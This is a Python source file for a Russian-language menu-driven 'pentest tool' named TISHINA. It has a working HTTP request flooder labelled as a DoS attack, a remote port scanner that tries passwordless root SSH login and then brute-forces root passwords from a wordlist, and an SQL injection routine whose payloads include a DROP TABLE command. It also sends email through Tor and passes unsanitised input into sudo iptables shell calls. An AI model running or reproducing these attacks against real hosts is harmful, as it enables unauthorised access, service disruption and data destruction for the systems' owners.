import os
import socket
import concurrent.futures
import asyncio
import aiohttp
import logging
from termcolor import colored
import time
import smtplib
import socks
import requests
import paramiko
import pyfiglet

# Логирование
logging.basicConfig(filename='tishina.log', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Очистка экрана
os.system('cls' if os.name == 'nt' else 'clear')

open_ports = []
attempts_per_ip = {}

password_dict_path = "posspasswords.txt"

def show_menu():
    ascii_art = pyfiglet.figlet_format("TISHINA", font="doom")

    # Используем голубой цвет (cyan)
    menu = (
        f"{colored(ascii_art, 'cyan')}"
        f"{colored('        pentest tool by @tisheplease', 'cyan')}"
        f"\n{colored('=============================================================', 'cyan')}"
        f"\n{colored('1. Сканировать уязвимости       |  5. Разблокировать IP', 'cyan')}"
        f"\n{colored('2. Dos - атака                  |  6. Просмотр логов', 'cyan')}"
        f"\n{colored('3. Добавить IP в черный список  |  7. Анонимная рассылка (Tor)', 'cyan')}"
        f"\n{colored('4. Проверка IP                  |  8. Закрыть программу', 'cyan')}"
        f"\n{colored('9. SQL Инъекция ', 'cyan')}"
        f"\n{colored('=============================================================', 'cyan')}"
    )
    print(menu)







def log_action(action):
    logging.info(action)


def scan_vulnerabilities():
    print(colored("Сканируем порты на локальном устройстве...", "cyan"))
    log_action("Начато сканирование уязвимостей.")
    open_ports.clear()

    with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
        futures = [executor.submit(scan_port, port) for port in range(1, 1025)]

        for future in concurrent.futures.as_completed(futures):
            result = future.result()
            if result:
                open_ports.append(result)

    if open_ports:
        print(colored(f"\nОткрытые порты: {open_ports}", "cyan"))
        log_action(f"Обнаружены открытые порты: {open_ports}")
        scanner_answer = input("Закрыть эти порты? (д/н): ")
        if scanner_answer.lower() == "д":
            for port in open_ports:
                block_port(port)
            print(colored("Все открытые порты закрыты.", "cyan"))
            log_action("Открытые порты заблокированы.")
        else:
            print("Порты не были закрыты.")
    else:
        print("Нет открытых портов на устройстве.")
        log_action("Открытые порты не найдены.")
    input("Нажмите Enter, чтобы вернуться в главное меню...")


def scan_port(port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(1)
    result = sock.connect_ex(('127.0.0.1', port))
    sock.close()
    if result == 0:
        return port
    return None


async def send_mass_requests():
    async def send_request(session, url):
        try:
            async with session.get(url) as response:
                return await response.text()
        except:
            return None

    async def main(target_url, num_requests):
        async with aiohttp.ClientSession() as session:
            tasks = [send_request(session, target_url) for _ in range(num_requests)]
            await asyncio.gather(*tasks)

    target_url = input("Введите URL/IP для запроса: ")
    num_requests = int(input("Количество запросов: "))
    await main(target_url, num_requests)


def block_ip():
    ip = input("Введите IP для блокировки: ")
    os.system(f'sudo iptables -A INPUT -s {ip} -j DROP')
    log_action(f"IP {ip} добавлен в черный список.")


def check_ip():
    ip = input("Введите IP для проверки: ")
    print(colored(f"Проверка {ip}...", "cyan"))

    open_ports = []

    # Проверяем порты (1-1024)
    for port in range(1, 5000):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(1)
            result = sock.connect_ex((ip, port))
            if result == 0:
                open_ports.append(port)

    if open_ports:
        print(colored(f"Открытые порты на {ip}: {open_ports}", "green"))
    else:
        print(colored("Нет открытых портов.", "red"))

    # Проверяем порт 22 (SSH)
    if 22 in open_ports:
        print(colored("Порт 22 открыт! Пробуем войти без пароля...", "yellow"))

        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        try:
            ssh.connect(ip, username='root', password='', timeout=3)
            print(colored("Удалось войти БЕЗ пароля!", "green"))
            log_action(f"Удалось войти без пароля на {ip} (SSH)")
        except paramiko.AuthenticationException:
            print(colored("Не удалось войти без пароля. Пробуем брутфорс...", "red"))
            perform_bruteforce(ip)
        except Exception as e:
            print(colored(f"Ошибка: {e}", "red"))
        finally:
            ssh.close()
    else:
        print(colored("Порт 22 закрыт.", "red"))

    input("Нажмите Enter, чтобы вернуться в меню...")


def perform_bruteforce(ip):
    print(colored(f"Начинаем брутфорс SSH на {ip}...", "yellow"))

    try:
        with open(password_dict_path, "r") as file:
            passwords = file.readlines()

        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        for password in passwords:
            password = password.strip()
            try:
                ssh.connect(ip, username='root', password=password, timeout=5)
                print(colored(f"🔥 УСПЕШНЫЙ ВХОД! Пароль: {password}", "green"))
                log_action(f"Брутфорс успешен! IP: {ip}, пароль: {password}")
                ssh.close()
                return  # Выход после успешного входа
            except paramiko.AuthenticationException:
                print(colored(f"❌ Неверный пароль: {password}", "red"))
            except Exception as e:
                print(colored(f"⚠ Ошибка: {e}", "red"))

        print(colored("❌ Все пароли испробованы, доступ не получен.", "red"))

    except FileNotFoundError:
        print(colored(f"⚠ Файл {password_dict_path} не найден!", "red"))


def unblock_ip():
    ip = input("Введите IP для разблокировки: ")
    os.system(f'sudo iptables -D INPUT -s {ip} -j DROP')
    log_action(f"IP {ip} разблокирован.")


def view_logs():
    print(colored("Последние 20 записей лога:", "cyan"))
    try:
        with open("tishina.log", "r") as file:
            lines = file.readlines()
            for line in lines[-20:]:
                print(colored(line.strip(), "cyan"))
    except FileNotFoundError:
        print("Файл логов не найден.")
    input("Нажмите Enter, чтобы вернуться в главное меню...")


def block_port(port):
    os.system(f'sudo iptables -A INPUT -p tcp --dport {port} -j REJECT')
    log_action(f"Порт {port} заблокирован.")


def send_anonymous_email():
    tor_ip = "127.0.0.1"
    tor_port = 9050
    socks.set_default_proxy(socks.SOCKS5, tor_ip, tor_port)
    socket.socket = socks.socksocket

    from_email = input("Введите свой email: ")
    to_email = input("Введите email получателя: ")
    subject = input("Введите тему письма: ")
    body = input("Введите текст письма: ")

    try:
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(from_email, "your_email_password")
        message = f"Subject: {subject}\n\n{body}"
        server.sendmail(from_email, to_email, message)
        print(colored("Письмо отправлено анонимно.", "cyan"))
        log_action(f"Отправлено анонимное письмо с {from_email} на {to_email}")
    except Exception as e:
        print(colored(f"Ошибка при отправке письма: {e}", "red"))


def sql_injection():
    url = input("Введите URL для тестирования: ")
    print("Проверка на SQL инъекции...")

    # Примеры различных типов SQL инъекций
    payloads = [
        "' OR 1=1 -- ",
        "' UNION SELECT NULL, username, password FROM users -- ",
        "' AND 1=1 -- ",
        "' AND 1=2 -- ",
        "' OR 'a'='a -- ",
        "'; DROP TABLE users -- "
    ]

    for payload in payloads:
        target_url = url + payload
        try:
            response = requests.get(target_url)
            if response.status_code == 200:
                print(colored(f"Уязвимость обнаружена с payload: {payload}", "green"))
                log_action(f"SQL инъекция обнаружена с payload: {payload} на {url}")
            else:
                print(colored(f"Запрос с payload: {payload} не дал уязвимости.", "red"))
        except requests.exceptions.RequestException as e:
            print(colored(f"Ошибка при подключении: {e}", "red"))

    input("Нажмите Enter, чтобы вернуться в меню...")
    os.system('cls' if os.name == 'nt' else 'clear')


async def main_program():
    while True:
        show_menu()
        choice = input(colored("Выберите опцию: ", "cyan"))
        if choice == "1":
            scan_vulnerabilities()
        elif choice == "2":
            await send_mass_requests()
        elif choice == "3":
            block_ip()
        elif choice == "4":
            check_ip()
        elif choice == "5":
            unblock_ip()
        elif choice == "6":
            view_logs()
        elif choice == "7":
            send_anonymous_email()
        elif choice == "8":
            log_action("Приложение закрыто пользователем.")
            print("Закрытие приложения...")
            break
        elif choice == "9":
            sql_injection()
        else:
            input("Неправильная опция. Нажмите Enter, чтобы вернуться.")


if __name__ == "__main__":
    asyncio.run(main_program())
